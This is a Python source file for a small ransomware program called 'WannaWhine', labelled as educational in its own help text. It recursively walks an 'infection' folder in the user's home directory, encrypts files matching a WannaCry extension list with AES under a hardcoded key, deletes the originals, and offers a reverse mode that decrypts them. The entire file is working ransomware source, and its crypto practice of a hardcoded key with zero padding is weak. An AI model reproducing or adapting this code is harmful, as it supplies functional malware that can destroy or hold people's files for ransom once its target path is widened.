import argparse
import os
from Crypto.Cipher import AES #pip
from Crypto import Random

RANSOM = os.environ["HOME"] + '/infection/'
KEY = 'v8y/B?E(H+MbQeTh'

def parse_args():
	parser = argparse.ArgumentParser(prog='WannaWhine', description='Small Ransomware', epilog='Do evil for educational purposes. Made by: cruiz-de')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0', help='displays program version number.')
	parser.add_argument('-r', '--reverse', action='store_true', help='decreypts the encrypted files.')
	parser.add_argument('-s', '--silent', action='store_true', help='silent mode.')
	args = parser.parse_args()
	return args

def check_infection():
	if os.path.isdir('/home/' + os.getlogin() + '/infection'):
		return True
	else:
		return False

def check_file_extension(file):
	with open('wannacry_file_extensions.txt', 'r') as ext:
		for line in ext.readlines():
			if file.endswith(line.strip()):
				return True
		return False

def loop_file(args):
	files = getListOfFiles(RANSOM)
	for file in files:
		if check_file_extension(file) and not args.reverse:
			encrypt_files(file)
		elif args.reverse and file.endswith(".ft"):
			decrypt_files(file)
		elif args.silent is False and args.reverse is False:
			print('[-] ' + file + ' not encrypted.')
		else:
			print('[-] ' + file + ' not decrypted.')

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        # If entry is a directory then get the list of files in this directory 
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)         
    return allFiles

def padding(data):
	return data+b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt(files):
	files = padding(files)
	initialization_vector = Random.new().read(AES.block_size) #produce different encrypted data so that an attacker
	cipher = AES.new(KEY, AES.MODE_CBC, initialization_vector)
	return initialization_vector + cipher.encrypt(files)

def encrypt_files(file_name):
	with open(file_name, 'rb') as open_f:
		text = open_f.read()
	open_f.close()
	encryption = encrypt(text)
	with open(file_name + '.ft', 'wb') as open_f:
		open_f.write(encryption)
	open_f.close()
	os.remove(file_name)
	if args.silent is False:
		print('[+] ' + file_name + ' encrypted.')

def decrypt(ciphered):
	initialization_vector = ciphered[:AES.block_size]
	cipher = AES.new(KEY, AES.MODE_CBC, initialization_vector)
	text = cipher.decrypt(ciphered[AES.block_size:])
	return text.rstrip(b"\0")

def decrypt_files(file_name):
	with open(file_name, 'rb') as open_f:
		text = open_f.read()
	open_f.close()
	decryption = decrypt(text)
	with open(file_name[:-3], 'wb') as open_f:
		open_f.write(decryption)
	open_f.close()
	os.remove(file_name)
	if args.silent is False:
		print('[+] ' + file_name + ' decrypted.')


if __name__ == '__main__':
	args = parse_args()
	if check_infection():
		loop_file(args)